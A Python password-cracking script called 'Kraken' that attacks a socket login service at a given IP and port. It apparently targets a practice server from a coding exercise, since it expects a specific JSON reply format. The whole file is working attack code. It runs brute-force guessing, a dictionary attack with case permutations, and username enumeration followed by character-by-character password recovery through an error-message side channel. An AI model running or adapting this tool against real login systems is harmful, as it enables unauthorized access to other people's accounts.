import socket
import argparse
import itertools
import string
import json


parser = argparse.ArgumentParser()
parser.add_argument('ip_address')
parser.add_argument('port')

args = parser.parse_args()


class Kraken:
    _characters = tuple(string.ascii_lowercase)
    _numbers = tuple(string.digits)
    _all_values = tuple(itertools.chain(_characters, _numbers))
    _current_list = _all_values[:]
    _typical_passwords = []
    _typical_users = []
    _current_login = {"login": "", "password": " "}
    _current_pass = ""
    _decoded_response = json.dumps({"result": "Wrong login!"})
    _wrong_login = json.dumps({"result": "Wrong login!"})
    _wrong_pass = json.dumps({"result": "Wrong password!"})
    _except = json.dumps({"result": "Exception happened during login"})
    _success = json.dumps({"result": "Connection success!"})

    def __init__(self):
        self.address = (args.ip_address, int(args.port))

    def next_attempt(self, method):
        if method == "brute":
            while True:
                for text in self._current_list:
                    yield text
                self._current_list = [a + b for a, b in itertools.product(self._current_list[:], self._all_values)]
        elif method == "dict":
            self.load_pass()
            for current_entry in self._typical_passwords:
                all_variations = map(''.join, itertools.product(*zip(current_entry.lower(), current_entry.upper())))
                for variation in all_variations:
                    yield variation
        elif method == "except":
            self.load_users()
            for user in self._typical_users:
                self._current_login["login"] = user
                yield json.dumps(self._current_login)

                if self._decoded_response == self._wrong_pass:
                    break

            self._current_login["password"] = ""

            while self._decoded_response == self._wrong_pass or self._decoded_response == self._except:
                test_char = tuple(itertools.chain(
                    string.ascii_lowercase,
                    string.ascii_uppercase,
                    string.digits))

                for char in test_char:
                    self._current_login["password"] = self._current_pass + char
                    yield json.dumps(self._current_login)

                    if self._decoded_response == self._except:
                        self._current_pass = self._current_login["password"]
                        break

    def load_pass(self):
        with open('passwords.txt', 'r', encoding='utf-8') as passwords:
            for line in passwords.readlines():
                self._typical_passwords.append(line.strip())

    def load_users(self):
        with open('logins.txt', 'r', encoding='utf-8') as logins:
            for line in logins.readlines():
                self._typical_users.append(line.strip())

    def try_bite(self, client: socket.socket, word: str):
        data = word.encode('utf8')
        client.send(data)
        response = client.recv(1024)
        self._decoded_response = response.decode('utf8')

        if self._decoded_response == "Wrong password!":
            return 0  # continue
        elif self._decoded_response == "Connection success!" or self._decoded_response == self._success:
            print(word)
            return 1  # break
        elif self._decoded_response == "Too many attempts":
            return 1  # break

    def bite(self, method):
        with socket.socket() as client_socket:
            client_socket.connect(self.address)

            for word in self.next_attempt(method):
                result = self.try_bite(client_socket, word)

                if result == 0:
                    continue
                elif result == 1:
                    break


kraken = Kraken()
kraken.bite("except")
